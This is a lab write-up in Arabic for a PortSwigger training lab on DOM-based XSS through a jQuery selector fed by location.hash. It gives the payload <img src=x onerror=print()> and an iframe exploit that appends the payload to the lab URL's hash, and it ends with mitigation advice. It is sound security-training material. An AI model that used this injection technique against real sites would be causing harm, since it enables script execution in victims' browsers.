## 1. ุงููุฏู ูู ุงููุงุจุฉ (Lab Objective)

- **ุงููุฏู ุงูุฑุฆูุณู:** ุงุณุชุบูุงู ุซุบุฑุฉ DOM XSS ูู ููุญุฏุฏุงุช jQuery (Selectors).
- **ุงููุฏู ุงูููุงุฆู:** ุชูููุฐ ุฏุงูุฉ `print()` ุชููุงุฆูุงู ููุถุญูุฉ.

## 2. ุดุฑุญ ุงูุซุบุฑุฉ (Vulnerability Explanation)

- **ููุน ุงูุซุบุฑุฉ:** DOM-based XSS (jQuery Selector Sink)
- **ุงููุตู:** ุงูุชุทุจูู ูุณุชุฎุฏู ุญุฏุซ `hashchange` ูุชูุฑูุฑ ูููุฉ ุงููุงุด (`location.hash`) ูุจุงุดุฑุฉ ุฅูู ุฏุงูุฉ ุงูุงุฎุชูุงุฑ ูู jQuery: `$(...)`. ููุญุฏุฏุงุช jQuery ูููููุง ุชูุณูุฑ ูุฏุฎูุงุช HTML ุฅุฐุง ุจุฏุฃุช ุจู `<`. ูุฐุง ูุณูุญ ููููุงุฌู ุจุญูู ุนูุงุตุฑ HTML ุฌุฏูุฏุฉ ุฏุงุฎู ุงูุตูุญุฉ ุจูุฌุฑุฏ ุชุบููุฑ ุฑุงุจุท ุงูุตูุญุฉ.

## 3. ุฎุทูุงุช ุงูุญู (Solution Steps)

1. **ุงูุชุญููู:** ุงูููุฏ ุงูุถุนูู ูู: `$(window).on('hashchange', function(){ ... $(location.hash) ... });`.
2. **ุจูุงุก ุงูุจุงูููุฏ:** ูุญุชุงุฌ ูุญูู ูุณู ูููุฐ ุงูููุฏ ุชููุงุฆูุงู: `<img src=x onerror=print()>`.
3. **ุชุฌููุฒ ุงููุฌูู:** ุจูุง ุฃููุง ูุญุชุงุฌ ูุชุบููุฑ ุงููุงุด ููุถุญูุฉุ ุณูุณุชุฎุฏู `iframe` ูู ุณูุฑูุฑ ุงูุงุฎุชุฑุงู:

   ```html
   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
   ```

4. **ุงูุชูููุฐ:** ุฅุฑุณุงู ุงูุฑุงุจุท ููุถุญูุฉุ ุณูุชู ุชุญููู ุงูุตูุญุฉ ุซู ุชุญุฏูุซ ุงููุงุด ุจุฑูุฌูุงู ูุชุดุบูู ุงูุซุบุฑุฉ.

## 4. ุงูุฃุฏูุงุช ุงููุณุชุฎุฏูุฉ (Tools Used)

- [x] Exploit Server
- [x] Iframe (Auto-triggering event)

## 5. ููุทุงุช ุงูุดุงุดุฉ (Screenshots)

>
> [!IMPORTANT]
> ุฏุงูุฉ `$()` ูู ูุณุฎ jQuery ุงููุฏููุฉ ูุงูุช ุชุนุชุจุฑ ูู ุฃุฎุทุฑ ุงูู Sinks ูุฃููุง ูุฏ ุชูุดุฆ ุนูุงุตุฑ HTML ุจุฏูุงู ูู ูุฌุฑุฏ ุงุฎุชูุงุฑูุง.

---

## ๐ก๏ธ ููู ุชุญูู ููุณูุ (Mitigation)

- **Sanitize Input:** ูุง ุชูุฑุฑ ุฃุจุฏุงู ูุฏุฎูุงุช ูู ุงูุนููู ูุจุงุดุฑุฉ ูุฏูุงู jQuery.
- **Update jQuery:** ุงุณุชุฎุฏู ูุณุฎ jQuery ุงูุญุฏูุซุฉ ุงูุชู ูุงูุช ุจุชุญุณูู ุฃูุงู ุงููุญุฏุฏุงุช.

---
[ุฑุงุจุท ุงููุฎุชุจุฑ ุงูุฃุตูู](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
